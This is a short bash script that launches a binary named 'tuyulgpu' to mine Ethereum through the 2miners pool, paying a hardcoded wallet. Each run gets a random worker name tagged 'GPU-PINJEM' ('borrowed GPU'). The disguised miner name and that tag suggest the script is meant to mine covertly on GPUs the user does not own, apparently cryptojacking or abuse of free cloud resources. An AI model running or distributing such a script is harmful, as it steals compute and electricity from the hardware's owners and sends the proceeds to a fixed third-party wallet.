#!/bin/bash

POOL=asia-eth.2miners.com:2020

WALLET=0xb13f91835c32249e1506da1201e937d666652725

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

chmod +x tuyulgpu

./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
